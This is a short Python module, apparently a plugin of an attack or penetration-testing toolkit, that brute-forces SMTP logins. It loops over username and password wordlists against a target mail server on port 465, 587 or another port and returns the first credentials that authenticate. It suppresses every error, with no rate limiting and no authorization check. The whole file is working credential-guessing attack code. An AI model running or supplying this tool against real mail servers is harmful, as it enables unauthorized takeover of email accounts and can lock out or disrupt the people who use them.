import smtplib
import ssl

def run(target, port, usernames_path="wordlists/port_users.txt", passwords_path="wordlists/port_pw.txt"):
	try:
		with open(usernames_path, "r") as f:
			usernames = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "error": "Username file not found"}

	try:
		with open(passwords_path, "r") as f:
			passwords = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "error": "Password file not found"}

	for username in usernames:
		for password in passwords:
			try:
				if port == 465:
					context = ssl.create_default_context()
					server = smtplib.SMTP_SSL(target, port, context=context, timeout=5)
					server.ehlo()
				else:
					server = smtplib.SMTP(target, port, timeout=5)
					server.ehlo()
					if port == 587:
						server.starttls()
						server.ehlo()

				if 'auth' not in server.esmtp_features:
					server.quit()
					continue

				server.login(username, password)
				server.quit()
				return {"success": True, "username": username, "password": password}

			except smtplib.SMTPAuthenticationError:
				pass
			except Exception:
				pass

	return {"success": False}
